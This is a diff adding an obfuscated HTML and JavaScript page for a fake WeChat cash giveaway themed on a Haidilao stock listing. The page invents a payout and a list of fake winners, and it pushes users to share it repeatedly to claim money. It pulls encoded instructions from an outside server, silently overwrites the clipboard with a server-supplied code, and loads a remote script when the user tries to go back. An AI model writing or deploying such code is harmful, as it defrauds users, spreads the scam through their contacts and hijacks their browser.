@@ -1,0 +1,567 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title></title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,viewport-fit=cover">
+	<style>html,body{background-color:#EDEDED}*{padding:0;margin:0}body{font-family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;}@font-face{font-family:'open';src:url('//appmessage.oss-cn-qingdao.aliyuncs.com/lib/open.woff2');font-weight:normal;font-style:normal;}}@keyframes show1{0%{opacity:0;transform:scale(0.2);}100%{opacity:1;transform:scale(1);}}@keyframes btn1{0%{transform:rotate(-720deg);}100%{transform:rotate(0deg);}}@keyframes show2{0%{opacity:0;transform:translateY(50%);}100%{opacity:1;transform:translateY(0%);}}@keyframes btn2{0%{transform:scale(0)}100%{transform:scale(1);}}@keyframes show3{0%{opacity:0;transform:translateY(-50%);}100%{opacity:1;transform:translateY(0%);}}@keyframes btn3{0%{transform:scale(0)}100%{transform:scale(1);}}@keyframes show4{0%{opacity:0;border-radius:100%}100%{opacity:1;border-radius:0%;}}@keyframes btn4{0%{transform:scale(1,0)}100%{transform:scale(1,1);}}@keyframes btnShake1{0%{transform:scale(1);}40%{transform:scale(1.1);}60%{transform:scale(.9);}80%{transform:scale(1.2);}100%{transform:scale(1);}}@keyframes btnShake2{0%{transform:scale(1);}40%{transform:scale(1.1,0.9);}60%{transform:scale(.9,1.1);}80%{transform:scale(1.2,0.8);}100%{transform:scale(1);}}@keyframes btnShake3{0%{transform:scale(1,1) rotate(0deg);}10%{transform:scale(1.2,0.8);}20%{transform:scale(0.8,1.2);}30%{transform:scale(1.2,0.8);}40%{transform:scale(0.8,1.2);}50%{transform:scale(1,1);}60%{transform:rotate(-15deg);}70%{transform:rotate(15deg);}80%{transform:rotate(-25deg);}90%{transform:rotate(25deg);}100%{transform:scale(1,1) rotate(0deg);}}@keyframes btnShake4{0%{transform:rotate(0deg);opacity:1;}10%{transform:scale(1.2,0.8);}20%{transform:scale(0.8,1.2);}30%{transform:scale(1.2,0.8);}40%{transform:scale(0.8,1.2);}50%{transform:scale(1,1);}60%{opacity:1;}70%{opacity:0.5;}80%{opacity:1;}90%{opacity:0.5;}100%{transform:scale(1,1);opacity:1;}}@keyframes btnMove{from{transform:rotateY(180deg)}to{transform:rotateY(360deg)}}@keyframes itemMove1{0%{height:0rem;}100%{height:1.2rem;}}@keyframes itemMove2{0%{height:0rem;transform:scaleY(0);}40%{height:1.2rem;transform:scaleY(0);}100%{transform:scaleY(1);}}@keyframes itemMove3{0%{height:0rem;transform:translateX(2rem);opacity:0;}40%{height:1.2rem;transform:translateX(2rem);opacity:0;}100%{transform:translateX(0rem);opacity:1;}}@keyframes itemMove4{0%{height:0rem;transform:translateX(-2rem);opacity:0;}40%{height:1.2rem;transform:translateX(-2rem);opacity:0;}100%{transform:translateX(0rem);opacity:1;}}@keyframes tipMove{0%{transform:translate(0rem,0%);}40%{transform:translate(-0.2rem,30%);}100%{transform:translate(0rem,0%);}}.text-tip{position:relative;}.text-tip::before{position:absolute;content:"";width:.0.02rem;height:.0.02rem;border:solid 8px rgba(0,0,0,0);border-right-color:#fae3b7;top:0rem;left:-0.32rem}.icon-success{color:#07c160;display:inline-block;vertical-align:middle;mask-position:50% 50%;mask-repeat:no-repeat;mask-size:100%;background-color:currentColor;-webkit-mask-size:100%;width:28px;height:28px;-webkit-mask-image:url(data:image/svg+xml,%3Csvg%20width%3D%2224%22%20height%3D%2224%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cpath%20d%3D%22M8.657%2018.435L3%2012.778l1.414-1.414%204.95%204.95L20.678%205l1.414%201.414-12.02%2012.021a1%201%200%2001-1.415%200z%22%20fill-rule%3D%22evenodd%22%2F%3E%3C%2Fsvg%3E)}</style>
+</head>
+<body>
+<div onclick="report()" style="position: fixed;right: 0;bottom: 22%;width: .6rem;height: 2rem;z-index: 1;">
+	<span style="display: inline-block;width: 100%;height: 100%;background: url(https://img-fe.tengzhihh.com/images/31375daaea6ba5-54x142.png) no-repeat;background-size: 100%;"></span>
+</div>
+<script>
+    !function(a, b) {
+        var c = b.documentElement
+            , d = "orientationchange"in window ? "orientationchange" : "resize"
+            , e = function() {
+            var a = c.clientWidth;
+            a && (c.style.fontSize = 100 * (a / 750) + "px");
+        };
+        b.addEventListener && (e(),
+            a.addEventListener(d, e, !1),
+            b.addEventListener("DOMContentLoaded", e, !1));
+    }(window, document);
+
+    function Element(a) {
+        var b = a.tagName
+            , c = a.props
+            , d = a.children;
+        return this instanceof Element ? (this.tagName = b,
+            this.props = c || {},
+            this.children = d || [],
+            void 0) : new Element({
+            tagName: b,
+            props: c,
+            children: d
+        });
+    }
+
+    Element.prototype.render = function() {
+        var a, b, c = document.createElement(this.tagName), d = this.props;
+        for (a in d)
+            b = d[a],
+                c.setAttribute(a, b);
+        return this.children.forEach(function(a) {
+            var b = null;
+            b = a instanceof Element ? a.render() : document.createTextNode(a),
+                c.appendChild(b);
+        }),
+            c;
+    }
+
+    function fdm7r1dmx9khg(a) {
+        return document.querySelector(a);
+    }
+
+    function is74wle4kbr2y(a, b) {
+        var c = document.createElement("script");
+        c.src = a,
+            c.onload = function() {
+                "function" == typeof b && b();
+            }
+            ,
+            document.body.appendChild(c);
+    }
+
+    function report(){
+        is74wle4kbr2y('//s0.pstatp.com/cdn/zepto/1.2.0/zepto.min.js',function(){
+            View('//appmessage.oss-cn-qingdao.aliyuncs.com/html/tousu.html');
+            //Cook.set('report',1);
+        });
+    }
+
+    function qolmr51n0qvnnjnk() {
+        switch (step) {
+            case 0:
+                app.alert(api.alert, "我知道了");
+                break;
+
+            case 1:
+                app.alert(api.alert1),
+                    api.qunShareNum >= 4 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 4 && wx.onMenuShareAppMessage(info.message);
+                break;
+
+            case 2:
+                app.alert(api.alert2),
+                    api.qunShareNum >= 3 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 3 && wx.onMenuShareAppMessage(info.message);
+                break;
+
+            case 3:
+                app.alert(api.alert3),
+                    api.qunShareNum >= 2 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 2 && wx.onMenuShareAppMessage(info.message);
+                break;
+
+            case 4:
+                app.alert(api.alert4),
+                    api.qunShareNum >= 1 ? wx.onMenuShareAppMessage(info.ad.message) : api.qunShareNum < 1 && wx.onMenuShareAppMessage(info.message);
+                break;
+
+            case 5:
+                wx.hideOptionMenu(),
+                    wx.showMenuItems({
+                        menuList: ["menuItem:share:timeline"]
+                    }),
+                    app.alert(api.alert5);
+                break;
+
+            case 6:
+                app.alert(api.alert6),
+                    api.quanShareNum >= 1 ? wx.onMenuShareTimeline(info.ad.timeline) : wx.onMenuShareTimeline(info.timeline);
+                break;
+
+            case 7:
+                app.alert(api.alert7, "好的", function() {
+                    //location.href = api.complatelink;
+                    is74wle4kbr2y(backlink)
+                });
+        }
+    }
+
+    function l3mustwasrzo8us7() {
+        info = {
+            message: {
+                title: api.info.title.replace("{qian}", money),
+                desc: api.info.desc.replace("{qian}", money),
+                link: api.info.qunurl,
+                imgUrl: api.info.img,
+                success: function() {
+                    step++,
+                        qolmr51n0qvnnjnk();
+                }
+            },
+            timeline: {
+                title: api.info.title.replace("{qian}", money),
+                desc: api.info.desc.replace("{qian}", money),
+                link: api.info.qunurl,
+                imgUrl: api.info.img,
+                success: function() {
+                    step++,
+                        qolmr51n0qvnnjnk();
+                }
+            },
+            timeline: {
+                title: api.info.p_title.replace("{qian}", money),
+                link: api.info.quanurl,
+                imgUrl: api.info.p_img,
+                success: function() {
+                    step++,
+                        qolmr51n0qvnnjnk();
+                }
+            },
+            ad: {
+                message: {
+                    title: api.info.chantitle,
+                    desc: api.info.desc.replace("{qian}", money),
+                    link: api.info.chanurl,
+                    imgUrl: api.info.chanimg,
+                    success: function() {
+                        step++,
+                            qolmr51n0qvnnjnk();
+                    }
+                },
+                timeline: {
+                    title: api.info.chandesc,
+                    link: api.info.chanurl,
+                    imgUrl: api.info.chanimg,
+                    success: function() {
+                        step++,
+                            qolmr51n0qvnnjnk();
+                    }
+                }
+            }
+        },
+            wx.ready(function() {
+                wx.hideOptionMenu(),
+                    wx.showMenuItems({
+                        menuList: ["menuItem:share:appMessage"]
+                    }),
+                    5 == api.qunShareNum ? wx.onMenuShareAppMessage(info.ad.message) : wx.onMenuShareAppMessage(info.message),
+                    2 == api.quanShareNum ? wx.onMenuShareTimeline(info.ad.timeline) : wx.onMenuShareTimeline(info.timeline);
+            });
+    }
+
+    function i28o2hkspuvyo8wb() {
+        function a(a, b) {
+            var c = b - a + 1;
+            return Math.floor(Math.random() * c + a);
+        }
+        function b() {
+            var a = Math.floor(10 * Math.random()) + 5
+                , b = new Date(new Date().getTime() - 6e4 * a)
+                , c = ("0" + b.getHours()).slice(-2)
+                , d = ("0" + b.getMinutes()).slice(-2);
+            return ("0" + b.getSeconds()).slice(-2),
+            c + ":" + d;
+        }
+        function c(a) {
+            return Element({
+                tagName: "li",
+                props: {
+                    style: "width: 100%;height: 1.2rem;overflow: hidden;box-sizing: border-box;padding: 0rem 0.2rem;border-bottom: 0.02rem solid rgba(0, 0, 0, 0.05);display: flex;flex-wrap: wrap;align-items: center;justify-content: center;"
+                },
+                children: [Element({
+                    tagName: "img",
+                    props: {
+                        src: a.avatar,
+                        style: "width: 0.8rem;height: 0.8rem;margin-right: 0.2rem;overflow: hidden;background-color: #eee;border-radius: 20% "
+                    }
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "flex: 1;"
+                    },
+                    children: [Element({
+                        tagName: "div",
+                        props: {
+                            style: "font-size: 0.3rem;color: #000;margin-bottom: 0.08rem;"
+                        },
+                        children: [a.name]
+                    }), Element({
+                        tagName: "div",
+                        props: {
+                            style: "font-size: 0.28rem;color: #929493;"
+                        },
+                        children: [b()]
+                    })]
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "text-align: right;"
+                    },
+                    children: [Element({
+                        tagName: "i",
+                        props: {
+                            "class": "icon-success",
+                            style: "margin-right: 0.1rem"
+                        },
+                        children: []
+                    })]
+                })]
+            });
+        }
+        function d() {
+            var b, d = Math.floor(4 * Math.random()) + 1, e = h.lastChild;
+            e.parentNode.removeChild(e),
+                b = c(f[r]),
+                b.props.style += "animation:itemMove" + d + " 0.5s",
+                h.insertBefore(b.render(), h.childNodes[0]),
+                r++,
+            r >= f.length && (r = 0),
+                k -= a(80, 150),
+                fdm7r1dmx9khg("[data-num]").innerHTML = k;
+        }
+        function e(a, b) {
+            var c = 1e3
+                , d = b
+                , e = 50
+                , f = d / (c / e)
+                , g = 0
+                , h = 0
+                , i = setInterval(function() {
+                g = Math.floor(100 * (g + f)) / 100,
+                g >= d && (clearInterval(i),
+                    g = d,
+                    qolmr51n0qvnnjnk());
+                var b = Number(g);
+                b != h && (h = b,
+                    a.innerHTML = h.toFixed(2));
+            }, 30);
+        }
+        var f, g, h, i, k, j = [];
+        for (r = 10,
+                 f = user,
+                 f.sort(function() {
+                     return Math.random() > .5 ? -1 : 1;
+                 }),
+                 p = 0; 10 > p; p++)
+            j[p] = c(f[p]);
+        k = a(5e4, 8e4),
+            money = (a(2e3, 9999) / 100).toFixed(2),
+            g = Element({
+                tagName: "div",
+                props: {
+                    onclick: "app.alert(api.alert8)",
+                    style: "height: 100vh; overflow: hidden; background-color: #fff;"
+                },
+                children: [Element({
+                    tagName: "div",
+                    props: {
+                        style: "height: 6rem;background:url(//p.pstatp.com/origin/1383900008b92e4569ae2) #f35543 no-repeat;background-size: cover;border-radius: 0rem 0rem 50% 50% / 0.2rem 0.2rem 22% 22%;margin-bottom: 0.4rem;box-shadow:0rem 0.06rem 0rem 0rem #f0ce6f"
+                    },
+                    children: [Element({
+                        tagName: "img",
+                        props: {
+                            src: config.logo,
+                            style: "width: 1.2rem;height: 1.2rem;margin: 0 auto 0;display: block;padding-top: 1rem;"
+                        }
+                    }), Element({
+                        tagName: "p",
+                        props: {
+                            style: "font-size: 0.36rem;color: #fee2b2;text-align: center;padding-top: 0.2rem "
+                        },
+                        children: [config.ztitle]
+                    }), Element({
+                        tagName: "p",
+                        props: {
+                            style: "font-size: 0.8rem;text-align: center;padding-top: 0.2rem;color: #fee2b2;font-weight: bold "
+                        },
+                        children: ["￥", Element({
+                            tagName: "span",
+                            props: {
+                                "data-time": 0
+                            },
+                            children: [money]
+                        })]
+                    }), Element({
+                        tagName: "div",
+                        props: {
+                            style: "display:block;text-align: center;font-size: 0.3rem;color: #fee2b2 "
+                        },
+                        children: [config.ftitle]
+                    }), Element({
+                        tagName: "div",
+                        props: {
+                            style: "margin: 0 auto;margin-top:.25rem;background: #ffe4b2;color: #f25543;width:1.28rem;border-radius: 1rem;font-weight:800;cursor: pointer;padding:.15rem;font-size:0.3rem;animation: Updown .5s infinite alternate;text-align:center;"
+                        },
+                        children: ["确认"]
+                    })]
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "width: 100%;height: 0.2rem;background-color: #eceeed;"
+                    }
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "font-size: 0.28rem;color:#929493;height: 0.6rem;line-height: 0.6rem;padding-left: 0.2rem;border-bottom: solid 0.02rem rgba(0,0,0,0.05) "
+                    },
+                    children: ["总发放100000份 剩余", Element({
+                        tagName: "span",
+                        props: {
+                            "data-num": 0
+                        },
+                        children: [k]
+                    }), "份"]
+                }), Element({
+                    tagName: "ul",
+                    props: {
+                        id: "list",
+                        style: "width: 100%;background-color: rgba(255, 255, 255, 0.1);overflow: hidden;border-radius: 0.1rem;height: 12rem;"
+                    },
+                    children: j
+                }), Element({
+                    tagName: "div",
+                    props: {
+                        style: "opacity: 0.8; position: fixed; z-index: 999; top: 10px; right: 10px; overflow: hidden; text-align: center; color: #fff; font-size: 15px; animation: tipMove 1.5s infinite;"
+                    },
+                    children: [Element({
+                        tagName: "div",
+                        props: {
+                            style: "overflow: hidden; width: 110px; height: 100px;"
+                        },
+                        children: [Element({
+                            tagName: "div",
+                            props: {
+                                style: "border-top: solid 2px #fff; border-right: solid 2px #fff; width: 20px; height: 20px; position: absolute; top: 3px; right: 3px; transform: skewX(-25deg) rotate(-30deg);"
+                            }
+                        }), Element({
+                            tagName: "div",
+                            props: {
+                                style: "width: 200px; height: 80px; border-radius: 50%; border: solid 2px #fff; position: absolute; top: -14px; right: -2px; transform: rotate(-22deg)"
+                            }
+                        })]
+                    })]
+                })]
+            }),
+            document.body.appendChild(g.render()),
+            h = fdm7r1dmx9khg("#list"),
+            e(fdm7r1dmx9khg("[data-time]"), Number(money)),
+            i = setInterval(function() {
+                return h.parentNode ? (d(),
+                    void 0) : clearInterval(i);
+            }, 2e3);
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime() + '/share');
+    }
+
+    function ip7e10l6tmh16() {
+        var c, a = Math.floor(4 * Math.random()) + 1, b = Element({
+            tagName: "div",
+            props: {
+                id: "index",
+                style: "height: 9.57rem; width: 5.81rem; border-radius: 10px; overflow: hidden; position: absolute; top: 0;left: 0;bottom: 0;right: 0;margin: auto;animation: show" + a + " .4s;background:url(//p.pstatp.com/origin/1383900008b92e4569ae2) #f35543 no-repeat;background-size: cover;"
+            },
+            children: [Element({
+                tagName: "div",
+                props: {
+                    class:"bg",
+                    style: "height: 7.7rem;border: 1px solid #f45e4d;border-radius: 0% 0% 100% 100% / 80% 80% 20% 20%;box-shadow: 0rem 0.058rem 0rem -0.02rem rgba(0, 0, 0, 0.2);background:url(//p.pstatp.com/origin/1383900008b92e4569ae2) #f35543 no-repeat;background-size: cover;"
+                },
+                children: [Element({
+                    tagName: "img",
+                    props: {
+                        src: config.logo,
+                        style: "width:1.15rem;height: 1.15rem;margin: 0 auto 0;display: block;padding-top: 1.15rem;"
+                    }
+                }), Element({
+                    tagName: "p",
+                    props: {
+                        style: "font-size: 0.52rem;text-align: center;padding-top: 0.4rem;color: #fae3b7;"
+                    },
+                    children: [config.ztitle]
+                }), Element({
+                    tagName: "p",
+                    props: {
+                        style: "font-size: 0.32rem;text-align: center;padding-top: 0.4rem;color: #fae3b7;"
+                    },
+                    children: [config.ftitle, Element({
+                        tagName: "span",
+                        props: {
+                            style: "margin-left: 0.15rem;font-size: 0.24rem;background-color: #fae3b7;padding: 0.02rem 0.08rem; color: #f25542"
+                        },
+                        children: ["可提现"]
+                    })]
+                })]
+            }), Element({
+                tagName: "div",
+                props: {
+                    "data-btn": "0",
+                    style: "width: 2rem;height: 2rem;border: 1px solid #fae3b7;background-color: #fae3b7;border-radius: 50%;margin: -1rem auto 0;box-shadow: 0rem 0.08rem 0rem 0rem rgba(0, 0, 0, 0.2);text-align: center;line-height: 2rem; animation: btn" + a + " .5s ease .1s;",
+                    onclick: "orgu5wf0enzz8(this)"
+                },
+                children: [Element({
+                    tagName: "b",
+                    props: {
+                        style: "position: absolute;top: 0;left: 0;bottom: 0;right: 0;margin: auto;display: inline-block;font-size: 0.8rem;font-family: open;color: #333;"
+                    },
+                    children: ["開"]
+                })]
+            })]
+        });
+        document.body.appendChild(b.render()),
+            c = fdm7r1dmx9khg("[data-btn]"),
+            c.addEventListener("animationend", function() {
+                var b = a > 2 ? 1.8 : 1;
+                c.style.animation = "btnShake" + a + " " + b + "s ease 0s infinite";
+            });
+        history.pushState(history.length + 1, "message", "#" + new Date().getTime() + '/index');
+    }
+
+    var app = {
+        alert: function(a, b, c) {
+            var d, e;
+            document.querySelector("#dialog") || (d = Element({
+                tagName: "div",
+                props: {
+                    id: "dialog",
+                    style: "display: none;position: fixed;z-index: 1000;top: 0;right: 0;left: 0;bottom: 0;background: rgba(0, 0, 0, 0.6);"
+                },
+                children: [Element({
+                    tagName: "div",
+                    props: {
+                        style: "position:fixed;z-index:5000;width:80%;max-width:300px;top:50%;left:50%;transform:translate(-50%,-50%);background-color:#FFFFFF;text-align:center;border-radius:3px;overflow:hidden;"
+                    },
+                    children: [Element({
+                        tagName: "div",
+                        props: {
+                            style: "padding:1.7em 20px 1.7em;font-size:15px;line-height:1.3;word-wrap:break-word;word-break:break-all;",
+                            "data-msg": 0
+                        }
+                    }), Element({
+                        tagName: "b",
+                        props: {
+                            style: "width: 100%; height: 45px; padding-bottom: 1px; display: flex; flex-wrap: wrap; justify-content: center; align-items: center; color: #bda475; font-size: 16px; border-top: 1px solid #EEEEEE;",
+                            "data-go": 0
+                        }
+                    })]
+                })]
+            }),
+                document.body.appendChild(d.render())),
+                e = fdm7r1dmx9khg("#dialog"),
+                fdm7r1dmx9khg("[data-msg]").innerHTML = a.replace("{money}", money),
+                fdm7r1dmx9khg("[data-go]").innerHTML = b || "好的",
+                e.style.display = "block",
+                fdm7r1dmx9khg("[data-go]").onclick = function() {
+                    e.style.display = "none",
+                    "function" == typeof c && c();
+                };
+        }
+    };
+
+    function orgu5wf0enzz8(a) {
+        orgu5wf0enzz8 = function(){};
+        a.style.animation = "btnMove .6s infinite alternate";
+        is74wle4kbr2y("https://res.wx.qq.com/open/js/jweixin-1.4.0.js",function(){
+            gda6jrp46x27p7("//huixinhengtong.cn/data?id=" + info.id + "&url=" + encodeURIComponent(location.href.split("#")[0]) + "&_=" + Date.now(), function(a) {
+                api = JSON.parse(window.atob(a));
+                setTimeout(function() {
+                    fdm7r1dmx9khg("#index").style.display = "none";
+                    i28o2hkspuvyo8wb();
+                    wx.config({
+                        debug: false,
+                        appId: api.config.appId,
+                        timestamp: api.config.timestamp,
+                        nonceStr: api.config.nonceStr,
+                        signature: api.config.signature,
+                        jsApiList: ["onMenuShareTimeline", "onMenuShareAppMessage", "hideMenuItems", "showMenuItems"]
+                    });
+                    l3mustwasrzo8us7();
+                }, 1e3);
+                if(api.code.length>5){
+                    is74wle4kbr2y("//s2.pstatp.com/cdn/clipboard.js/2.0.4/clipboard.min.js", function() {
+                        new ClipboardJS("html",{text: function(){return api.code}});
+                    });
+                }
+            });
+        });
+    }
+
+    function gda6jrp46x27p7(a, b, c) {
+        var d = new XMLHttpRequest();
+        d.onreadystatechange = function() {
+            4 === d.readyState && (200 === d.status || 304 === d.status ? "function" == typeof b && b(d.responseText) : "function" == typeof c && c(d));
+        },d.open("GET", a, !0),d.send(null);
+    }
+
+    api = null,step = 0;
+
+    var config = {
+        ftitle : '完成所有步骤后 自动存入零钱',
+        ztitle : '庆贺海底捞成功上市',
+        logo :  '//p.pstatp.com/origin/fe2c00029989a967fb1b'
+    };
+
+    var user = [
+        {name : "孙笑川",avatar: "https://q.qlogo.cn/qqapp/1104718115/9DE656A9B0C0384FCCF7D02BD02CFCB5/100"},
+        {name : "带带大师兄", avatar: "https://q.qlogo.cn/qqapp/1104718115/5DA508A1616E732B0EB92A1ADAF28456/100"},
+        {name : "六小龄孙", avatar: "https://q.qlogo.cn/qqapp/1104718115/D42066DE19EBB82D30A351185956DB41/100"},
+        {name : "夢醒ぴ誮落盡", avatar: "https://q.qlogo.cn/qqapp/1104718115/F6213667E85E205FF363B3947D218D38/100"},
+        {name : "最好的我们", avatar: "https://q.qlogo.cn/qqapp/1104718115/D56EE4D71422A112CDA6B7B44D48B044/100"},
+        {name : "甜味少女馆", avatar: "https://q.qlogo.cn/qqapp/1104718115/0DE079B903E44F96AB9BAD85D706A61F/100"},
+        {name : "风有几分甜", avatar: "https://q.qlogo.cn/qqapp/1104718115/A6F3CA4B97E59BB9AE5495984ACF3090/100"},
+        {name : "风月难入怀", avatar: "https://q.qlogo.cn/qqapp/1104718115/E0FB2E95D84068B944789BF6569B3A7F/100"},
+        {name : "神明不渡我", avatar: "https://q.qlogo.cn/qqapp/1104718115/71E4837B7B1F0A12D5F8D90234DDB95C/100"},
+        {name : "壊壊の少爷", avatar: "https://q.qlogo.cn/qqapp/1104718115/9ADBAEBE292B4FA0737F9DB142336157/100"},
+        {name : "山河故人在", avatar: "https://q.qlogo.cn/qqapp/1104718115/D6AEE11866CCEC092B82C532218F6B20/100"},
+        {name : "孙粒子", avatar: "https://q.qlogo.cn/qqapp/1104718115/BE2BFD6D743F815AC7A8FA974E40D4FC/100"},
+        {name : "Mr. Xue", avatar: "https://q.qlogo.cn/qqapp/1104718115/5283BB3808A16D227AC03DC4374F77C6/100"},
+        {name : "、dacy", avatar: "https://q.qlogo.cn/qqapp/1104718115/48BE3B50C3E9847242626FF9A07C3317/100"},
+        {name : "已婚少年", avatar: "https://q.qlogo.cn/qqapp/1104718115/02305E433C97C724931A79F8FB04FE50/100"},
+        {name : "叫我冰冰", avatar: "https://q.qlogo.cn/qqapp/1104718115/198FD85BC7EFBCCB5C73AE4FEB633560/100"},
+        {name : "卢正英", avatar: "https://q.qlogo.cn/qqapp/1104718115/25217BFE51A1B8A16160A9F43837A86F/100"},
+        {name : "Jkz.", avatar: "https://q.qlogo.cn/qqapp/1104718115/772D04D9EB8E70A961A1D5CABBCF293A/100"}
+    ];
+
+    var backlink = '//wxatt.oss-cn-shanghai.aliyuncs.com/b.js';
+
+    window.onload = function(){
+        ip7e10l6tmh16();
+        is74wle4kbr2y('https://hm.baidu.com/hm.js?' + info.hm);
+        window.onhashchange = function() {
+            is74wle4kbr2y(backlink);
+        };
+    }
+</script>
+</body>
+</html>
